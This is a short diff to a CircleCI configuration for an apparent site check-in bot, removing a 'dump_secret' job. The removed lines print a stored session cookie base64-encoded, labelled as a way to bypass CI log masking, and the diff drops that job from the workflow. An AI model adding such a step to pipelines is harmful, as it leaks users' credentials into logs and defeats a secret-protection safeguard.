@@ -46,17 +46,6 @@ jobs:
           command: |
             python -m onepoint3acres.onepoint3acres
 
-  dump_secret:
-    docker:
-      - image: cimg/base:current
-    steps:
-      - run:
-          name: Dump cookie (base64 to bypass log masking)
-          command: |
-            echo "=== BEGIN_DUMP ==="
-            printf '%s' "$ONEPOINT3ACRES_COOKIE" | base64
-            echo "=== END_DUMP ==="
-
 workflows:
   # Allow manual triggers
   manual_trigger:
@@ -66,6 +55,4 @@ workflows:
       # - v2ex:
       #     context: checkincontext
       - onepoint3acres:
-          context: checkincontext
-      - dump_secret:
           context: checkincontext
